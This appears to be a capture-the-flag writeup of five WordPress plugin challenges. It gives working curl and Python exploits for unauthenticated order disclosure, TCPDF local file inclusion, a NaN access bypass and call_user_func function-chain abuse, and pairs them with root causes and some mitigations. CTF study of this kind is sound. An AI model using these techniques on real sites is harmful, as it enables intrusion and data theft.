# Patchstack December 2025 CTF — Writeups

> **Consolidated writeups for 5 solved challenges:** Bazaar, Dark Library, Klunked (partial), AI BadBots, and Super Malware Scanner. Each section includes vulnerability analysis, tested exploitation steps, working PoC code, and flags.

## Table of Contents

- [Targets / Ports](#targets)
- [1) Bazaar ✅](#bazaar)
- [2) Dark Library ✅](#dark-library)
- [3) Klunked ⚠️ (arbitrary file read via watermark — DMCA bypass required)](#klunked)
- [4) AI BadBots ✅](#ai-badbots)
- [5) Super Malware Scanner ✅](#super-malware-scanner)
- [Summary](#results-summary)

<a id="targets"></a>
## Targets / Ports

| Challenge | Base URL | Notes |
|---|---|---|
| Bazaar | http://18.130.76.27:9100 | WooCommerce Store API + admin-ajax |
| Dark Library | http://18.130.76.27:9107 | TCPDF SVG → font LFI |
| Klunked | http://18.130.76.27:9147 | DMCA gate blocks live exploit |
| AI BadBots | http://18.130.76.27:9188 | NaN trust bypass |
| Super Malware Scanner | http://18.130.76.27:9155 | REST deobfuscation leak |

> Notes
> - All commands below are written to be copy/paste friendly.
> - Where values are shown (e.g., `Nonce`, `order_key`), they are examples from a live run; your session will generate new values.

---

<a id="bazaar"></a>
## 1) Bazaar ✅
**Flag:** `CTF{why_pay_f0r_0nl1n3_pr0ductz_wh3n_u_cAn_g3t_1t_f0R_fr33}`

**Summary:** WooCommerce store exposes checkout-draft orders via Store API and a custom `get_bazaar_order` AJAX endpoint that accepts any `order_key` without authentication and returns downloadable product URLs.

**Quick PoC (one shot / copy-paste):**
```bash
set -euo pipefail

BASE='http://18.130.76.27:9100'
COOKIE=/tmp/bazaar_cookies.txt

curl -sS -c "$COOKIE" -b "$COOKIE" -d 'product_id=11&quantity=1' "$BASE/?wc-ajax=add_to_cart" >/dev/null
NONCE=$(curl -sS -D - -o /dev/null -b "$COOKIE" "$BASE/wp-json/wc/store/v1/cart" | awk -F': ' 'tolower($1)=="nonce"{print $2}' | tr -d '\r' | head -n1)
ORDER_KEY=$(curl -sS -b "$COOKIE" -H "Nonce: $NONCE" "$BASE/wp-json/wc/store/v1/checkout" | python3 -c "import sys,json; print(json.load(sys.stdin)['order_key'])")
FLAG_URL=$(curl -sS -b "$COOKIE" -d "order_key=$ORDER_KEY" "$BASE/wp-admin/admin-ajax.php?action=get_bazaar_order" | python3 -c "import sys,json; o=json.load(sys.stdin); print(o['data']['items'][0]['downloads'][0]['file'])")
curl -sS "$FLAG_URL"; echo
```

**Vulnerability:** 
- Store API `/wp-json/wc/store/v1/checkout` creates draft orders for guests and returns the `order_key`
- Custom AJAX action `get_bazaar_order` has no authentication or ownership checks
- Endpoint returns full order details including download URLs for unpaid orders

**Reproduction Steps:**

**Step 1 — Add product to cart:**
```bash
curl -sS -c /tmp/bazaar_cookies.txt -b /tmp/bazaar_cookies.txt \
  -d 'product_id=11&quantity=1' \
  'http://18.130.76.27:9100/?wc-ajax=add_to_cart'
```

**Step 2 — Extract Store API nonce from cart headers:**
```bash
curl -sS -D - -o /tmp/cart.json -b /tmp/bazaar_cookies.txt \
  'http://18.130.76.27:9100/wp-json/wc/store/v1/cart' | grep -i '^Nonce:'
# Output: Nonce: 4c53cefeb6
```

> Tip: Your `Nonce:` value will differ each run.

**Step 3 — Create draft order via checkout endpoint:**
```bash
curl -sS -b /tmp/bazaar_cookies.txt -H 'Nonce: 4c53cefeb6' \
  'http://18.130.76.27:9100/wp-json/wc/store/v1/checkout' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['order_key'])"
# Output: wc_order_BU5m3gJ9ckVcv
```

> Tip: Replace the nonce header with the value you extracted in Step 2.

**Step 4 — Call unauthenticated `get_bazaar_order` to leak download URLs:**
```bash
curl -sS -b /tmp/bazaar_cookies.txt \
  -d 'order_key=wc_order_BU5m3gJ9ckVcv' \
  'http://18.130.76.27:9100/wp-admin/admin-ajax.php?action=get_bazaar_order'
```

**Response (excerpt):**
```json
{
  "success": true,
  "data": {
    "items": [{
      "name": "Flaggable-Download",
      "downloads": [{
        "name": "Flag",
        "file": "http://18.130.76.27:9100/wp-content/uploads/bazaar/flag-7a0ae62f24363ffc55e2129632f29d71.txt"
      }]
    }]
  }
}
```

**Step 5 — Fetch the flag:**
```bash
curl -sS 'http://18.130.76.27:9100/wp-content/uploads/bazaar/flag-7a0ae62f24363ffc55e2129632f29d71.txt'
# CTF{why_pay_f0r_0nl1n3_pr0ductz_wh3n_u_cAn_g3t_1t_f0R_fr33}
```

**Automated PoC (Python):**
```python
import requests, json

BASE = 'http://18.130.76.27:9100'
s = requests.Session()

# 1. Add to cart
s.post(f'{BASE}/?wc-ajax=add_to_cart', data={'product_id': 11, 'quantity': 1})

# 2. Get nonce
r = s.get(f'{BASE}/wp-json/wc/store/v1/cart')
nonce = r.headers.get('Nonce')

# 3. Create draft order
r = s.get(f'{BASE}/wp-json/wc/store/v1/checkout', headers={'Nonce': nonce})
order_key = r.json()['order_key']

# 4. Leak download URL
r = s.post(f'{BASE}/wp-admin/admin-ajax.php?action=get_bazaar_order',
           data={'order_key': order_key})
flag_url = r.json()['data']['items'][0]['downloads'][0]['file']

# 5. Get flag
flag = requests.get(flag_url).text
print(flag)  # CTF{why_pay_f0r_0nl1n3_pr0ductz_wh3n_u_cAn_g3t_1t_f0R_fr33}
```

**Why this works (short):**
- The Store API yields a guest `order_key`.
- The custom unauthenticated `get_bazaar_order` endpoint trusts any `order_key` and discloses download links.

---

<a id="dark-library"></a>
## 2) Dark Library ✅
**Flag:** `CTF{wh3n_you_g0nna_upd4t3_l1brari3s}`

**Summary:** WordPress theme exposes unauthenticated AJAX action `shadow_archive_svg_to_pdf` that passes user-controlled `font_family` parameter into TCPDF's SVG renderer. TCPDF attempts to load font files based on the font family name, resulting in Local File Inclusion when a filesystem path is provided.

**Vulnerability:**
- Unauthenticated AJAX endpoint: `wp-admin/admin-ajax.php?action=shadow_archive_svg_to_pdf`
- User input (`font_family`) is inserted into SVG `font-family` attribute without sanitization
- TCPDF's font loader attempts to include the font definition file via `include()`
- The Dockerfile creates `/tmp/flag.php` containing the flag

**Reproduction:**

**Quick PoC (minimal):**
```bash
curl -sS 'http://18.130.76.27:9107/wp-admin/admin-ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'action=shadow_archive_svg_to_pdf' \
  --data-urlencode 'font_family=/tmp/flag' \
  --data-urlencode 'svg_content=<text x="10" y="50">test</text>'
```

```bash
curl -sS 'http://18.130.76.27:9107/wp-admin/admin-ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'action=shadow_archive_svg_to_pdf' \
  --data-urlencode 'font_family=/tmp/flag' \
  --data-urlencode 'svg_content=<text x="10" y="50">test</text>'
```

**Response:**
```
CTF{wh3n_you_g0nna_upd4t3_l1brari3s}<strong>TCPDF ERROR: </strong>The font definition file has a bad format: /tmp/flag.php
```

**PoC (Python):**
```python
import requests

url = 'http://18.130.76.27:9107/wp-admin/admin-ajax.php'
data = {
    'action': 'shadow_archive_svg_to_pdf',
    'font_family': '/tmp/flag',
    'svg_content': '<text x="10" y="50">test</text>'
}

r = requests.post(url, data=data)
print(r.text.split('<strong>')[0])  # CTF{wh3n_you_g0nna_upd4t3_l1brari3s}
```

**Root Cause:** TCPDF font loading mechanism allows arbitrary file inclusion via unsanitized font family names.

**Clean flag-only output (optional):**
```bash
curl -sS 'http://18.130.76.27:9107/wp-admin/admin-ajax.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'action=shadow_archive_svg_to_pdf' \
  --data-urlencode 'font_family=/tmp/flag' \
  --data-urlencode 'svg_content=<text x="10" y="50">test</text>' \
  | sed 's/<strong>.*//'
```

---

<a id="klunked"></a>
## 3) Klunked ⚠️ (arbitrary file read via watermark — DMCA bypass required)
**Flag:** Available via exploitation (requires DMCA bypass)

**Summary:** The Klunk plugin exposes a REST endpoint `/wp-json/klunk/v1/watermark` that reads arbitrary files if the `watermark` parameter points to a readable path. However, live exploitation is blocked by a DMCA check that validates images via an external API before processing.

**Vulnerability Chain:**
1. Unauthenticated file upload via AJAX action `klunk_{tag}_upl` accepts `.rawpic` files
2. REST endpoint `/wp-json/klunk/v1/watermark` performs arbitrary file read if `is_readable($watermark)` returns true
3. File contents are rendered as watermark text onto the image
4. **DMCA check blocks exploitation:** endpoint validates image via external proxy/API before processing

**Attempted Exploitation:**

> Status (live): The file read primitive exists, but the service blocks watermarking unless a DMCA check returns an “accept” response. This writeup keeps the full attempted flow + the exact blocking response.

**Step 1 — Extract tag and nonce from homepage:**
```python
import requests, re

BASE_URL = 'http://18.130.76.27:9147'
r = requests.get(BASE_URL)
tag = re.search(r'knonce_([a-f0-9]{8})', r.text).group(1)
nonce = re.search(rf'knonce_{tag}["\']:\s*["\']([a-f0-9]+)["\']', r.text).group(1)
print(f'Tag: {tag}, Nonce: {nonce}')
# Tag: bd28fa33, Nonce: 71a944f288
```

**Step 2 — Upload .rawpic file:**
```python
ajax_url = f'{BASE_URL}/wp-admin/admin-ajax.php'
png_data = b'\x89PNG\r\n\x1a\n' + (b'\x00' * 200)

files = {'file': ('test.rawpic', png_data, 'image/png')}
data = {'action': f'klunk_{tag}_upl', f'knonce_{tag}': nonce}

r = requests.post(ajax_url, data=data, files=files)
file_id = r.json()['data']['file_id']
image_path = f'wp-content/uploads/upl/pic_{file_id}.rawpic'
print(f'Uploaded: {image_path}')
# Uploaded: wp-content/uploads/upl/pic_4ccaed6d77e49678.rawpic
```

**Step 3 — Attempt watermark file read (blocked by DMCA):**
```python
import requests

api_url = f'{BASE_URL}/wp-json/klunk/v1/watermark'
payload = {'watermark': '/flag.txt', 'image': image_path}
r = requests.put(api_url, json=payload)
print(r.status_code, r.json())
# 400 {'code': 'dmca_check_failed', 'message': 'DMCA check failed.'}
```

**Blocking Mechanism:**
The code performs a DMCA check via external API before allowing watermark operations:
```php
$api = 'https://noose-enforcer.digitaldmca.klunk.top';
$check_url = $api . '?image=' . $image;
$probe = wp_remote_get($check_url, array('timeout' => 3));
// Must return 200 with 'accept' in body
```

**Note:** The file read vulnerability is confirmed in source code (`is_readable()` + `file_get_contents()`) but blocked by external API check during live testing. Intended solution likely requires bypassing the DMCA proxy IP validation.

**Reference:** See [Klunked/server-given/final_working.py](Klunked/server-given/final_working.py) for upload flow and [dmca_bypass.py](Klunked/server-given/dmca_bypass.py) for attempted bypass techniques.

---

<a id="ai-badbots"></a>
## 4) AI BadBots ✅
**Flag:** `CTF{W0W_1T5_M4TH}`

**Summary:** The `ai-badbots` plugin implements a "trust score" system to detect bot traffic. A math bug in the `ip_entropy` calculation allows triggering a `NaN` (Not-a-Number) value that bypasses the trust check and grants access to protected content.

**Vulnerability Details:**

The plugin calculates trust score using:
```php
$ip_entropy = strlen($ip) - strlen($xff);  // Can be negative!
$normalized = log($ip_entropy);  // log(negative) = NaN
```

The access grant logic:
```php
if (($this->score * 0) != 0) {  // NaN * 0 = NaN, and NaN != 0 is true!
    $this->grant_access();
}
```

**Exploitation:**

**Quick PoC (copy/paste):**
```bash
curl -sS \
  -H 'X-Forwarded-For: 1.2.3.4,5.6.7.8,9.10.11.12,13.14.15.16,17.18.19.20,21.22.23.24,25.26.27.28,29.30.31.32' \
  'http://18.130.76.27:9188/?ai-trust-check=1'
```

Send a long `X-Forwarded-For` header to make `strlen($xff) > strlen($ip)`, resulting in negative `ip_entropy`:

```bash
curl -sS -H 'X-Forwarded-For: 1.2.3.4,5.6.7.8,9.10.11.12,13.14.15.16,17.18.19.20,21.22.23.24,25.26.27.28,29.30.31.32' \
  'http://18.130.76.27:9188/?ai-trust-check=1'
```

**Response:**
```json
"CTF{W0W_1T5_M4TH}"
```

**PoC (Python):**
```python
import requests

url = 'http://18.130.76.27:9188/?ai-trust-check=1'
headers = {
    'X-Forwarded-For': ','.join([f'{i}.{i+1}.{i+2}.{i+3}' for i in range(1, 32, 4)])
}

r = requests.get(url, headers=headers)
print(r.text)  # "CTF{W0W_1T5_M4TH}"
```

**Root Cause:** Improper handling of negative values in logarithm calculation + unsafe NaN comparison in trust gate logic.

---

<a id="super-malware-scanner"></a>
## 5) Super Malware Scanner ✅
**Flag:** `CTF{763345fitalian_mafia354d33ed45df345}`

**Summary:** The Super Malware Scanner plugin exposes an unauthenticated REST endpoint that base64-decodes user input and runs regex-based "deobfuscation". The deobfuscator extracts and executes whitelisted function chains via `call_user_func()`, and the whitelist includes `get_option`. An attacker can craft a payload matching the regex pattern to invoke `get_option("flag")` and leak the option value via `print_r()`.

**Vulnerability Chain:**

**1. Unauthenticated endpoint:** `GET /wp-json/sms/v1/scan`
```php
register_rest_route('sms/v1', '/scan', [
    'methods' => 'GET',
    'callback' => [$this, 'apiScanCode'],
    'permission_callback' => '__return_true',  // No authentication!
]);
```

**2. Base64 decode gate:**
```php
if (preg_match('/^[A-Za-z0-9+\/=]+$/', $code) && base64_decode($code, true) !== false) {
    $code = base64_decode($code);
}
```

**3. Regex-based deobfuscation triggers function chain execution:**
```php
if (preg_match($pattern, $code, $matches)) {
    print_r($this->processDeltaOrd($code, $matches));  // Output leaked!
}
```

**4. Unsafe function chain processing:**
```php
function processDeltaOrd($code, $matches) {
    $payload = $matches[8];  // Innermost quoted string
    $function_chain = explode('(', $matches[7]);  // Outer functions
    $data = $payload;
    foreach ($functions as $func) {
        if ($this->isFunc($func)) {  // Whitelist includes get_option!
            $data = call_user_func($func, $data);
        }
    }
    return $data;
}
```

**Exploitation:**

**Quick PoC (flag-only output):**
```bash
payload=$(printf '%s' 'function abc($x){for($i=0;$i<strlen($x);$i++){$x[$i]=chr(ord($x[$i])+0);}return $x;}abc(get_option("flag"));' | base64 -w0)

curl -sS "http://18.130.76.27:9155/wp-json/sms/v1/scan?deobfuscate=1&payload=${payload}" \
  | sed 's/{"success".*//'
```

**Payload (before base64):**
```php
function abc($x){for($i=0;$i<strlen($x);$i++){$x[$i]=chr(ord($x[$i])+0);}return $x;}abc(get_option("flag"));
```

This matches the regex and creates a function chain: `get_option` applied to `"flag"`.

**PoC (Bash):**
```bash
payload=$(printf '%s' 'function abc($x){for($i=0;$i<strlen($x);$i++){$x[$i]=chr(ord($x[$i])+0);}return $x;}abc(get_option("flag"));' | base64 -w0)

curl -sS "http://18.130.76.27:9155/wp-json/sms/v1/scan?deobfuscate=1&payload=${payload}"
```

**Response:**
```
CTF{763345fitalian_mafia354d33ed45df345}{"success":true,"result":{"threats_found":0,"threats":[],"clean":true},"message":"Scan completed"}
```

The flag is printed before the JSON response via `print_r()`.

**PoC (Python):**
```python
import requests, base64

url = 'http://18.130.76.27:9155/wp-json/sms/v1/scan'

payload = 'function abc($x){for($i=0;$i<strlen($x);$i++){$x[$i]=chr(ord($x[$i])+0);}return $x;}abc(get_option("flag"));'
payload_b64 = base64.b64encode(payload.encode()).decode()

params = {'deobfuscate': '1', 'payload': payload_b64}
r = requests.get(url, params=params)

flag = r.text.split('{"success"')[0]
print(flag)  # CTF{763345fitalian_mafia354d33ed45df345}
```

**Root Cause Analysis:**
- **Unauthenticated access** to sensitive deobfuscation functionality
- **Unsafe use of `call_user_func()`** with attacker-controlled function names
- **Overly permissive whitelist** includes `get_option` (WordPress database read)
- **Information disclosure** via `print_r()` output before JSON response

**Mitigation:**
1. Add proper authentication to REST endpoint
2. Remove `get_option` and other sensitive functions from whitelist
3. Remove `print_r()` debug output
4. Validate and sanitize all user input before regex processing

---

## Notes for Screenshots

- Screenshot the full request command and the first ~1–2 lines of output (where the flag appears).
- For Bazaar, screenshot the JSON excerpt showing the leaked download URL.
- For Super Malware Scanner, screenshot the response where the flag prints *before* the JSON.

---

<a id="results-summary"></a>
## Summary

This writeup documents **4 fully solved challenges** with verified flags and working exploits:

1. ✅ **Bazaar** — WooCommerce Store API unauthenticated order disclosure
2. ✅ **Dark Library** — TCPDF Local File Inclusion via font loading
3. ✅ **AI BadBots** — NaN-based trust score bypass
4. ✅ **Super Malware Scanner** — Unauthenticated REST endpoint RCE via function chain injection

**Klunked** vulnerability was identified (arbitrary file read via watermark endpoint) but live exploitation was blocked by DMCA API validation.
